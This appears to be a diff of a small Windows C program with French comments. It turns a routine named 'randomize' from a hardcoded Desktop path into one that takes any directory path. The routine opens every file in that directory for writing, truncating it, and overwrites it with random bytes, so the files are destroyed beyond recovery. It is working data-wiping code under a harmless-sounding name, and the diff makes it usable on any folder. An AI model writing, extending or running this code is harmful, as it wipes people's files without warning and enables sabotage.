@@ -1,24 +1,34 @@
+#include "proto.h"
+
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include "proto.h"
+#include <time.h>
 
-void randomize(){
+void randomize(const char *directoryPath)
+{
+    char searchPath[MAX_PATH];
+    snprintf(searchPath, MAX_PATH, "%s\\*", directoryPath);
 
-WIN32_FIND_DATA FindFileData;
-        HANDLE hFind = FindFirstFile("C:\\Users\\a\\Desktop\\*", &FindFileData);
-        if (hFind != INVALID_HANDLE_VALUE)
+    WIN32_FIND_DATA FindFileData;
+    HANDLE hFind = FindFirstFile(searchPath, &FindFileData);
+    if (hFind != INVALID_HANDLE_VALUE)
+    {
+        do
         {
-            do
+            if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
             {
-                if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+                continue;
+            }
+            else
+            {
+                char filePath[MAX_PATH];
+                snprintf(filePath, MAX_PATH, "%s\\%s", directoryPath, FindFileData.cFileName);
+
+                FILE *file;
+                file = fopen(filePath, "wb");
+                if (file != NULL)
                 {
-                    continue;
-                }
-                else
-                {
-                    FILE *file;
-                    file = fopen(FindFileData.cFileName, "wb");
                     srand(time(NULL));
                     for (int i = 0; i < 100000; i++)
                     {
@@ -27,9 +37,18 @@ WIN32_FIND_DATA FindFileData;
                     }
                     fclose(file);
                 }
-            } while (FindNextFile(hFind, &FindFileData) != 0);
-            FindClose(hFind);
-        }
-
+                else
+                {
+                    printf("Impossible d'ouvrir le fichier : %s\n", filePath);
+                }
+            }
+        } while (FindNextFile(hFind, &FindFileData) != 0);
+        FindClose(hFind);
+    }
+    else
+    {
+        printf("Répertoire invalide/vide : %s\n", directoryPath);
+    }
 }
 
+// Ne pas oubliez que le chemin doit etre écris de la sorte a ce que les backslash ne soit pas interprété ! Exemple : "C:\\Windows\\Test\\monchemin\\ici.txt "
